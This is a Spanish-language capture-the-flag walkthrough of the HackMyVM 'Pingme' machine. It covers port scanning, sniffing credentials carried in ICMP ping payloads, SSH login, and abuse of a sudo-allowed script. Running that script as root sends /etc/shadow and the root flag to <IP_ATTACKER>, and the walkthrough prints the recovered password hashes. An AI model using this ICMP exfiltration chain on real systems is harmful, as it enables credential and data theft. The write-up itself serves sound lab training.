---
icon: flag
---

# Pingme HackMyVM (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 11:00 EDT
Nmap scan report for 192.168.28.15
Host is up (0.00078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 1f:e7:c0:44:2a:9c:ed:91:ca:dd:46:b7:b3:3f:42:4b (RSA)
|   256 e3:ce:72:cb:50:48:a1:2c:79:94:62:53:8b:61:0d:23 (ECDSA)
|_  256 53:84:2c:86:21:b6:e6:1a:89:97:98:cc:27:00:0c:b0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Ping test
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:8C:D1:FE (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
```

Veremos que tenemos una pagina web corriendo, si entramos dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

Vemos que esta realizando un `ping` desde nuestra `IP` a la de la maquina victima por lo que esta generando trafico `ICMP`, vamos a investigar un poco realizando un poco de `fuzzing`, pero no veremos gran cosa.

Ya que vemos que cada vez que recargamos se realizar un `ping` hacia nuestra maquina vamos a ponernos a la escucha mediante el trafico `ICMP` con la herramienta `tcpdump`, estando a la escucha recargaremos la pagina para ver el trafico de paquetes que sucede en dicha red.

## tcpdump

```shell
tcpdump -i <INTERFAZ_RED> icmp -A
```

Info:

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:20:09.107717 IP 192.168.28.15 > 192.168.28.5: ICMP echo request, id 62772, seq 1, length 64
E..T..@.@.v<.............4..J   .g....V{......e
username
username
username
username
us
13:20:09.107749 IP 192.168.28.5 > 192.168.28.15: ICMP echo reply, id 62772, seq 1, length 64
E..T.S..@.#..............4..J   .g....V{......e
username
username
username
username
us
13:20:09.617160 IP 192.168.28.15 > 192.168.28.5: ICMP echo request, id 56013, seq 1, length 64
E..T.H@.@.u............2....J   .g.....A......nger
pinger
pinger
pinger
pinger
pinger

13:20:09.617175 IP 192.168.28.5 > 192.168.28.15: ICMP echo reply, id 56013, seq 1, length 64
E..T....@.#............3....J   .g.....A......nger
pinger
pinger
pinger
pinger
pinger

13:20:10.125121 IP 192.168.28.15 > 192.168.28.5: ICMP echo request, id 50961, seq 1, length 64
E..T..@.@.u...........xM....K   .g............d
password
password
password
password
pa
13:20:10.125137 IP 192.168.28.5 > 192.168.28.15: ICMP echo reply, id 50961, seq 1, length 64
E..T....@.#............M....K   .g............d
password
password
password
password
pa
13:20:10.632783 IP 192.168.28.15 > 192.168.28.5: ICMP echo request, id 20323, seq 1, length 64
E..T..@.@.u'............Oc..L   .g.....>......ngM3
P!ngM3
P!ngM3
P!ngM3
P!ngM3
P!ngM3

13:20:10.632803 IP 192.168.28.5 > 192.168.28.15: ICMP echo reply, id 20323, seq 1, length 64
E..T....@.#n............Oc..L   .g.....>......ngM3
P!ngM3
P!ngM3
P!ngM3
P!ngM3
P!ngM3

^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

Vemos que nos esta llegando unas credenciales que serian las siguientes:

```
User: pinger
Pass: P!ngM3
```

Por lo que probaremos a meternos mediante `SSH`.

```shell
ssh pinger@<IP>
```

Metemos como contraseña `P!ngM3` y veremos que estamos dentro, por lo que leeremos ña `flag` del usuario.

> user.txt

```
HMV{ICMPisSafe}
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for pinger on pingme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinger may run the following commands on pingme:
    (root) NOPASSWD: /usr/local/sbin/sendfilebyping
```

Veremos que podemos ejecutar `sendfilebyping` como el usuario `root`, por lo que veremos que contiene:

```bash
#!/bin/bash
if [ "$#" -ne 2 ]; then
echo "sendfilebyping <ip address> <path to file>"
echo "Only sends 1 char at a time - no error checking and slow"
echo "(Just a proof of concept for HackMyVm - rpj7)"
exit 1
fi

INPUT=$2
TARGET=$1
i=0

while IFS= read -r -n1 char
do
    #One character at a time
    HEXVAL=$( echo -n "$char" |od -An -t x1|tr -d ' ')
    [  -z "$HEXVAL" ] && HEXVAL="0a"
    /bin/ping $TARGET -c 1 -p $HEXVAL -q >/dev/null
    ((i=i+1))
    echo "Packet $i"
done < "$INPUT"

# This will send a file
# Not quite got around to catching it yet
# Shouldnt be too hard should it ?...
# just need to get the pcap , tshark and get the last byte
```

### ¿Qué hace exactamente sendfilebyping?

**Comprueba que se pasen 2 argumentos**:

```
- `$1` → dirección IP de destino.
    
- `$2` → ruta del archivo a enviar.
    
- Si no se pasan, muestra ayuda y sale.
    
```

**Lee el archivo carácter por carácter**:

```
bash

CopiarEditar

`while IFS= read -r -n1 char`

- `-n1` → lee un solo carácter a la vez.
    
- `IFS=` evita que se eliminen espacios.
    
```

**Convierte cada carácter a hexadecimal**:

```
bash

CopiarEditar

`HEXVAL=$( echo -n "$char" | od -An -t x1 | tr -d ' ')`

- Usa `od` para obtener el valor hexadecimal del carácter.
    
- Si el carácter está vacío (como un salto de línea), pone `0a` (hex de `\n`).
    
```

**Envía un ping con ese byte en el payload**:

```
bash

CopiarEditar

`/bin/ping $TARGET -c 1 -p $HEXVAL -q >/dev/null`

- El parámetro `-p` permite definir el **payload del ping**.
    
- Esto efectivamente "envía" un carácter hexadecimal a la IP indicada.
    
```

**Cuenta los paquetes enviados**.

Por lo que podemos utilizar esto para exfiltrar archivos ejecutandolo como `root`, vamos a probar a intentar mandarnos por datos `ICMP` el archivo `shadow`.

> ESCUCHA ICMP HOST

```shell
sudo tcpdump -i <INTERFAZ_RED> icmp -w capture.pcap 
```

> ENVIO DE ARCHIVO VICTIMA

```shell
sudo /usr/local/sbin/sendfilebyping <IP_ATTACKER> /etc/shadow
```

Si volvemos a donde tenemos la escucha veremos que el archivo se ha generado de forma correcta:

```
capture.pcap
```

Ahora vamos a filtrar toda la informacion para verlo de forma clara:

```shell
tshark -r capture.pcap -Y "icmp" -T fields -e data.data | xxd -r -p | tr -d '\n' | sed 's/\(.\{79\}\)\(.\)/\2/g' | sed 's/:::/\n/g'
```

Info:

```
Running as user "root" and group "root". This could be dangerous.
Warning: program compiled against libxml 212 using older 209
root:$y$j9T$1/mbuD0Ul36emctpH9BZv.$ZDPIR4UtJ2FlOmtGdoXajvpu.CXH4GZJxG/mu68A.u3:19056:0:99999:7
daemon:*:19056:0:99999:7
bin:*:19056:0:99999:7
sys:*:19056:0:99999:7
sync:*:19056:0:99999:7
games:*:19056:0:99999:7
man:*:19056:0:99999:7
lp:*:19056:0:99999:7
mail:*:19056:0:99999:7
news:*:19056:0:99999:7
uucp:*:19056:0:99999:7
proxy:*:19056:0:99999:7
www-data:*:19056:0:99999:7
backup:*:19056:0:99999:7
list:*:19056:0:99999:7
irc:*:19056:0:99999:7
gnats:*:19056:0:99999:7
nobody:*:19056:0:99999:7
_apt:*:19056:0:99999:7
systemd-timesync:*:19056:0:99999:7
systemd-network:*:19056:0:99999:7
systemd-resolve:*:19056:0:99999:7
messagebus:*:19056:0:99999:7
avahi-autoipd:*:19056:0:99999:7
sshd:*:19056:0:99999:7
pinger:$y$j9T$MyNLWRrYtqxcMV9mDdz1O.$SqqoD/bofMbYohPuRVCrHUBkXgv24HpFb43SYa0JkP3:19056:0:99999:7
systemd-coredump:!*:19056
```

Vemos que esta funcionando de forma correcta, por lo que leeremos la `flag` de `root`.

> ESCUCHA ICMP HOST

```shell
sudo tcpdump -i <INTERFAZ_RED> icmp -w flagroot.pcap 
```

> ENVIO DE ARCHIVO VICTIMA

```shell
sudo /usr/local/sbin/sendfilebyping <IP_ATTACKER> /root/root.txt
```

Si volvemos a donde tenemos la escucha veremos que el archivo se ha generado de forma correcta:

```
flagroot.pcap
```

Ahora vamos a filtrar toda la informacion para verlo de forma clara:

```shell
tshark -r flagroot.pcap -Y "icmp" -T fields -e data.data | xxd -r -p | tr -d '\n' | sed 's/\(.\{79\}\)\(.\)/\2/g' | sed 's/:::/\n/g'
```

> root.txt

```
HMV{ICMPcanBeAbused}
```
